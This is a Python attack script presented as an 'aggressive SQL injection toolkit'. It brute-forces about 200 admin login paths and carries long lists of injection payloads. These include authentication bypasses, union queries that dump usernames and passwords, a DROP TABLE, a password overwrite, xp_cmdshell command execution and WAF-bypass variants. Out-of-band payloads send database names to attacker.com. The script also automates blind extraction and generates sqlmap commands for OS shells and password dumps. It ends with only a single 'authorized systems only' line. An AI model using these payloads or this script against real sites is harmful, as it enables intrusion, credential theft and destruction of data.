#!/usr/bin/env python3
"""
AGGRESSIVE SQL INJECTION TOOLKIT
Modern SQL Injection Automation with Blind/Time-Based Techniques
"""

import requests
import sys
import time
from concurrent.futures import ThreadPoolExecutor
import urllib.parse

# ============================================
# OPTION 1: HIDDEN LOGIN PAGE FINDER (200+)
# ============================================
HIDDEN_PATHS = [
    "/admin", "/admin/login", "/admin/admin", "/administrator", "/admin_area",
    "/adminpanel", "/admincp", "/moderator", "/staff", "/backend", "/secure",
    "/secret", "/private", "/hidden", "/login/admin", "/admin/login.php",
    "/admin/login.asp", "/admin/login.jsp", "/admin/account", "/admin_area/login",
    "/admin_area/admin", "/siteadmin", "/siteadmin/login", "/memberadmin",
    "/administrator/login", "/useradmin", "/sysadmin", "/manager", "/management",
    "/admin/login/auth", "/admin/dashboard", "/admin/controlpanel", "/webadmin",
    "/adminweb", "/administer", "/administration", "/phpmyadmin", "/mysqladmin",
    "/dbadmin", "/pma", "/myadmin", "/_admin", "/_private", "/_secret",
    "/wp-admin", "/wp-login", "/wordpress/wp-admin", "/wordpress/wp-login",
    "/joomla/administrator", "/drupal/user/login", "/magento/admin",
    "/opencart/admin", "/prestashop/admin", "/admin/config", "/admin/users",
    "/admin/console", "/admin/portal", "/admin/cp", "/admin/controls",
    "/admin/manage", "/admin/home", "/admin/index", "/admin/main",
    "/admin/admin_login", "/admin/access", "/admin/authenticate",
    "/admin/securelogin", "/admin/secure", "/admin/priv", "/admin/root",
    "/admin/super", "/admin/superuser", "/admin/sys", "/admin/system",
    "/login/auth", "/login/secure", "/login/private", "/login/hidden",
    "/auth/admin", "/auth/login", "/auth/secure", "/auth/private",
    "/controlpanel", "/controlpanel/login", "/cp", "/cp/login",
    "/dashboard", "/dashboard/login", "/master", "/master/login",
    "/root", "/root/login", "/super", "/super/login", "/sys", "/sys/login",
    "/system", "/system/login", "/user/login/admin", "/user/account/admin",
    "/admin/user", "/admin/account", "/admin/profile", "/admin/settings",
    "/admin/configurations", "/admin/options", "/admin/preferences",
    "/admin/tools", "/admin/utilities", "/admin/functions", "/admin/operations",
    "/admin/modules", "/admin/components", "/admin/plugins", "/admin/extensions",
    "/admin/themes", "/admin/templates", "/admin/layouts", "/admin/design",
    "/admin/content", "/admin/articles", "/admin/posts", "/admin/pages",
    "/admin/media", "/admin/files", "/admin/documents", "/admin/downloads",
    "/admin/uploads", "/admin/images", "/admin/videos", "/admin/audio",
    "/admin/gallery", "/admin/catalog", "/admin/products", "/admin/items",
    "/admin/store", "/admin/shop", "/admin/cart", "/admin/orders",
    "/admin/customers", "/admin/clients", "/admin/members", "/admin/visitors",
    "/admin/guests", "/admin/users", "/admin/accounts", "/admin/profiles",
    "/admin/contacts", "/admin/messages", "/admin/comments", "/admin/reviews",
    "/admin/feedback", "/admin/support", "/admin/help", "/admin/faq",
    "/admin/knowledgebase", "/admin/wiki", "/admin/documentation",
    "/admin/forums", "/admin/boards", "/admin/topics", "/admin/threads",
    "/admin/polls", "/admin/surveys", "/admin/quizzes", "/admin/tests",
    "/admin/exams", "/admin/courses", "/admin/lessons", "/admin/training",
    "/admin/education", "/admin/learning", "/admin/academy", "/admin/school",
    "/admin/classes", "/admin/students", "/admin/teachers", "/admin/instructors",
    "/admin/professors", "/admin/staff", "/admin/employees", "/admin/workers",
    "/admin/team", "/admin/crew", "/admin/group", "/admin/organization",
    "/admin/company", "/admin/business", "/admin/corporate", "/admin/office",
    "/admin/division", "/admin/department", "/admin/unit", "/admin/section",
    "/admin/branch", "/admin/subsidiary", "/admin/affiliate", "/admin/partner",
    "/admin/associate", "/admin/collaborator", "/admin/contributor",
    "/admin/volunteer", "/admin/intern", "/admin/trainee", "/admin/apprentice",
    "/admin/assistant", "/admin/helper", "/admin/aide", "/admin/secretary",
    "/admin/receptionist", "/admin/clerk", "/admin/typist", "/admin/operator",
    "/admin/technician", "/admin/engineer", "/admin/developer", "/admin/programmer",
    "/admin/designer", "/admin/architect", "/admin/analyst", "/admin/consultant",
    "/admin/adviser", "/admin/counselor", "/admin/therapist", "/admin/doctor",
    "/admin/nurse", "/admin/paramedic", "/admin/pharmacist", "/admin/dentist",
    "/admin/veterinarian", "/admin/lawyer", "/admin/attorney", "/admin/judge",
    "/admin/prosecutor", "/admin/defender", "/admin/guard", "/admin/officer",
    "/admin/soldier", "/admin/agent", "/admin/spy", "/admin/detective",
    "/admin/investigator", "/admin/inspector", "/admin/auditor", "/admin/examiner",
    "/admin/supervisor", "/admin/manager", "/admin/director", "/admin/executive",
    "/admin/officer", "/admin/chief", "/admin/head", "/admin/leader",
    "/admin/boss", "/admin/owner", "/admin/founder", "/admin/cofounder",
    "/admin/partner", "/admin/shareholder", "/admin/investor", "/admin/donor",
    "/admin/sponsor", "/admin/patron", "/admin/benefactor", "/admin/philanthropist",
    "/admin/humanitarian", "/admin/activist", "/admin/volunteer", "/admin/advocate",
    "/admin/campaigner", "/admin/organizer", "/admin/coordinator", "/admin/facilitator",
    "/admin/mediator", "/admin/negotiator", "/admin/arbitrator", "/admin/umpire",
    "/admin/referee", "/admin/judge", "/admin/adjudicator", "/admin/moderator"
]

def find_hidden_login(url):
    """Aggressive hidden login page finder"""
    found = []
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = []
        for path in HIDDEN_PATHS:
            target = url.rstrip('/') + path
            futures.append(executor.submit(check_path, target, path))
        
        for future in futures:
            result = future.result()
            if result:
                found.append(result)
    return found

def check_path(url, path):
    try:
        response = requests.get(url, timeout=5, allow_redirects=False)
        if response.status_code in [200, 301, 302, 403]:
            return f"[+] Found: {url} ({response.status_code})"
    except:
        pass
    return None

# ============================================
# OPTION 2: SQLMAP STYLE TABLE EXTRACTION
# ============================================
SQLMAP_PAYLOADS = {
    'union': [
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT @@version,2,3--",
        "' UNION SELECT user(),database(),version()--",
        "' UNION SELECT table_name,column_name,NULL FROM information_schema.columns--",
        "' UNION SELECT group_concat(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()--",
        "' UNION SELECT group_concat(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
        "' UNION SELECT username,password,NULL FROM users--",
        "' UNION SELECT email,password,NULL FROM users--",
        "' UNION SELECT concat(username,':',password),NULL,NULL FROM users--",
        "' UNION SELECT NULL,load_file('/etc/passwd'),NULL--"
    ],
    
    'error': [
        "' AND 1=CONVERT(int,@@version)--",
        "' AND 1=1/0--",
        "' OR 1=1 AND 1=CONVERT(int,@@version)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' OR SLEEP(5)--",
        "' AND SLEEP(5)--",
        "' OR BENCHMARK(1000000,MD5('test'))--"
    ],
    
    'blind': [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND SUBSTRING(@@version,1,1)='5'--",
        "' AND ASCII(SUBSTRING((SELECT user()),1,1))>97--",
        "' AND IF(1=1,SLEEP(5),0)--",
        "' OR IF(1=1,BENCHMARK(1000000,MD5('test')),0)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' XOR (SELECT 1 FROM (SELECT SLEEP(5))a)--",
        "' OR (SELECT 1 FROM (SELECT SLEEP(5))a)--"
    ]
}

# ============================================
# OPTION 3: 100+ INJECTION PAYLOADS
# ============================================
INJECTION_PAYLOADS = [
    # Basic Authentication Bypass
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "' OR '1'='1'/*",
    "admin'--",
    "admin'#",
    "admin'/*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR '1'='1--",
    "') OR ('1'='1--",
    
    # Union Based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1--",
    "' UNION SELECT 1,2--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT @@version--",
    "' UNION SELECT user()--",
    "' UNION SELECT database()--",
    
    # Error Based
    "' AND EXTRACTVALUE(0,CONCAT(0x3a,@@version))--",
    "' AND UPDATEXML(0,CONCAT(0x3a,@@version),0)--",
    "' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a)--",
    
    # Blind Boolean
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>97--",
    "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='a'--",
    "' AND (SELECT LENGTH(table_name) FROM information_schema.tables LIMIT 1)>5--",
    
    # Time-Based Blind
    "' AND SLEEP(5)--",
    "' AND IF(ASCII(SUBSTRING(database(),1,1))>97,SLEEP(5),0)--",
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '00:00:05'--",
    "'; WAITFOR DELAY '00:00:05' AND '1'='1",
    "'; WAITFOR DELAY '00:00:05' OR '1'='1",
    
    # Stacked Queries
    "'; DROP TABLE users--",
    "'; UPDATE users SET password='hacked' WHERE username='admin'--",
    "'; INSERT INTO users(username,password) VALUES('hacker','pwned')--",
    
    # Out-of-Band
    "' UNION SELECT LOAD_FILE('\\\\attacker\\share\\test.txt')--",
    "' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\test.txt')))--",
    
    # PostgreSQL
    "'::VARCHAR(5)",
    "' AND 1::int=1--",
    "' UNION SELECT NULL,current_database()--",
    "' AND (SELECT pg_sleep(5))--",
    
    # MySQL
    "' AND 1=1#",
    "' AND 1=1-- -",
    "' UNION SELECT NULL,@@version#",
    "' AND SLEEP(5)#",
    "' INTO OUTFILE '/tmp/test.txt'--",
    "' INTO DUMPFILE '/tmp/test.txt'--",
    
    # MSSQL
    "'; EXEC xp_cmdshell('dir')--",
    "' AND 1=CONVERT(int,@@version)--",
    "' UNION SELECT NULL,@@version--",
    "'; WAITFOR DELAY '0:0:5'--",
    
    # Oracle
    "' AND 1=to_char(1)--",
    "' UNION SELECT NULL,NULL FROM dual--",
    "' AND (SELECT * FROM (SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),5) FROM dual))--",
    
    # SQLite
    "' AND 1=1--",
    "' UNION SELECT NULL,sqlite_version()--",
    
    # NoSQL
    "' || '1'=='1",
    "{$ne: null}",
    "'; return true; var x='",
    
    # WAF Bypass
    "' /*!50000OR*/ '1'='1",
    "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--",
    "'%0AUNION%0ASELECT%0ANULL,NULL--",
    "'%09UNION%09SELECT%09NULL--",
    "'%0DUNION%0DSELECT%0DNULL--",
    "'/**/UNION/**/SELECT/**/NULL--",
    "'\tUNION\tSELECT\tNULL--",
    "'\nUNION\nSELECT\nNULL--",
    "'\rUNION\rSELECT\rNULL--",
    
    # Advanced
    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
    "' AND (SELECT LENGTH(CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS CHAR))) > 0--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    
    # File Operations
    "' UNION SELECT NULL,LOAD_FILE('/etc/passwd')--",
    "' UNION SELECT NULL,LOAD_FILE('C:/Windows/win.ini')--",
    
    # DNS Exfiltration
    "' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT HEX(SUBSTRING(table_name,1,10))),'.attacker.com\\test.txt')))--",
    
    # Command Execution
    "'; EXEC master..xp_cmdshell 'ping attacker.com'--",
    "' UNION SELECT NULL,NULL,NULL,NULL; EXEC xp_cmdshell 'dir C:'--",
    
    # Heavy Payloads
    "' AND 1=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--"
]

# ============================================
# OPTION 4: BLIND SQL INJECTION AUTOMATION
# ============================================
def blind_sql_injection(url, param, payload_template):
    """Aggressive blind SQL injection testing"""
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@.-"
    extracted = ""
    position = 1
    
    print(f"[*] Starting blind SQL injection on {param}")
    
    while True:
        found = False
        for char in chars:
            # Time-based blind detection
            payload = payload_template.replace("[CHAR]", str(ord(char))).replace("[POS]", str(position))
            target = f"{url}?{param}={urllib.parse.quote(payload)}"
            
            start_time = time.time()
            try:
                requests.get(target, timeout=10)
            except:
                pass
            elapsed = time.time() - start_time
            
            if elapsed > 4:  # Threshold for time-based
                extracted += char
                print(f"[+] Character {position}: {char}")
                found = True
                break
            
            # Boolean-based detection
            true_payload = payload_template.replace("[CHAR]", "1").replace("[POS]", "1")
            false_payload = payload_template.replace("[CHAR]", "0").replace("[POS]", "1")
            
            try:
                true_response = requests.get(f"{url}?{param}={urllib.parse.quote(true_payload)}", timeout=5)
                false_response = requests.get(f"{url}?{param}={urllib.parse.quote(false_payload)}", timeout=5)
                
                if true_response.text != false_response.text:
                    extracted += char
                    print(f"[+] Character {position}: {char}")
                    found = True
                    break
            except:
                pass
        
        if not found:
            break
        position += 1
    
    return extracted

# ============================================
# OPTION 5: AGGRESSIVE DATABASE ENUMERATION
# ============================================
ENUMERATION_PAYLOADS = {
    'version': ["' UNION SELECT @@version,NULL--", "' AND 1=CONVERT(int,@@version)--"],
    'user': ["' UNION SELECT user(),NULL--", "' UNION SELECT current_user,NULL--"],
    'database': ["' UNION SELECT database(),NULL--", "' UNION SELECT schema_name,NULL FROM information_schema.schemata--"],
    'tables': ["' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--"],
    'columns': ["' UNION SELECT group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='[TABLE]'--"],
    'dump': ["' UNION SELECT group_concat([COLUMN]),NULL FROM [TABLE]--"]
}

# ============================================
# MAIN EXPLOITATION FUNCTION
# ============================================
def exploit_sql(url, param):
    """Main aggressive SQL exploitation function"""
    print(f"[*] Target: {url}")
    print(f"[*] Parameter: {param}")
    print("[*] Testing with 100+ payloads...\n")
    
    vulnerable = False
    for i, payload in enumerate(INJECTION_PAYLOADS, 1):
        target = f"{url}?{param}={urllib.parse.quote(payload)}"
        try:
            response = requests.get(target, timeout=3)
            
            # Detection logic
            if any(error in response.text.lower() for error in ['sql', 'mysql', 'syntax', 'error', 'warning', 'exception']):
                print(f"[!] SQL Error detected with payload {i}: {payload[:50]}...")
                vulnerable = True
                
            # Time-based detection
            if payload.lower().count('sleep') or payload.lower().count('waitfor'):
                start = time.time()
                requests.get(target, timeout=10)
                elapsed = time.time() - start
                if elapsed > 4:
                    print(f"[!] Time-based SQLi detected with payload {i}")
                    vulnerable = True
        
        except Exception as e:
            pass
    
    return vulnerable

# ============================================
# QUICK COMMAND GENERATOR
# ============================================
def generate_sqlmap_commands(url):
    """Generate aggressive sqlmap commands"""
    commands = [
        f"sqlmap -u \"{url}\" --batch --random-agent --level=5 --risk=3",
        f"sqlmap -u \"{url}\" --batch --dbs",
        f"sqlmap -u \"{url}\" --batch -D database_name --tables",
        f"sqlmap -u \"{url}\" --batch -D database_name -T users --columns",
        f"sqlmap -u \"{url}\" --batch -D database_name -T users -C username,password,email --dump",
        f"sqlmap -u \"{url}\" --batch --os-shell",
        f"sqlmap -u \"{url}\" --batch --os-pwn",
        f"sqlmap -u \"{url}\" --batch --file-read=/etc/passwd",
        f"sqlmap -u \"{url}\" --batch --reg-read",
        f"sqlmap -u \"{url}\" --batch --passwords"
    ]
    return commands

# ============================================
# MAIN EXECUTION
# ============================================
if __name__ == "__main__":
    print("="*60)
    print("AGGRESSIVE SQL INJECTION MODERN TOOLKIT")
    print("="*60)
    
    if len(sys.argv) < 2:
        print("Usage: python3 sql_toolkit.py <target_url> [parameter]")
        print("\nOptions:")
        print("  1. Find hidden login pages (200+)")
        print("  2. Extract users/passwords/emails")
        print("  3. Test 100+ injection payloads")
        print("  4. Blind SQL injection automation")
        print("  5. Full database enumeration")
        print("\nExample: python3 sql_toolkit.py http://target.com/page.php?id=1 id")
        sys.exit(1)
    
    target = sys.argv[1]
    param = sys.argv[2] if len(sys.argv) > 2 else "id"
    
    # Run all options
    print("\n[+] OPTION 1: Finding hidden login pages...")
    found_logins = find_hidden_login(target.split('?')[0])
    for login in found_logins[:10]:  # Show first 10
        print(login)
    
    print("\n[+] OPTION 2: Testing SQL injection...")
    if exploit_sql(target.split('?')[0], param):
        print("[!] Target appears VULNERABLE to SQL injection!")
    else:
        print("[!] No obvious vulnerabilities found (may require deeper testing)")
    
    print("\n[+] OPTION 3: Generated sqlmap commands:")
    for cmd in generate_sqlmap_commands(target)[:3]:
        print(f"  {cmd}")
    
    print("\n[+] OPTION 4: Quick payload test (first 20):")
    for payload in INJECTION_PAYLOADS[:20]:
        print(f"  {payload}")
    
    print("\n" + "="*60)
    print("[*] Aggressive testing complete!")
    print("[*] Use sqlmap for deeper exploitation")
    print("[*] Always test on authorized systems only!")
    print("="*60)